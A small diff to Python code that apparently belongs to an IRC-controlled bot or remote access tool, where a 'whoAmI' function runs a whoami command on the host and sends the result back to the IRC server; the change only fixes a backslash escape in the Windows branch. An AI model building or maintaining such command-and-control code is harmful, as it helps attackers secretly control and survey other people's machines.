@@ -103,7 +103,7 @@ def reply(): #send back to IRC server that you are here
 
 def whoAmI(): #execute whoami command and send output
 	if operatingSystem == "windows":
-		output = execute("echo %userdomain%\%username%")
+		output = execute("echo %userdomain%\\%username%")
 	else:
 		output  = execute("whoami")
 
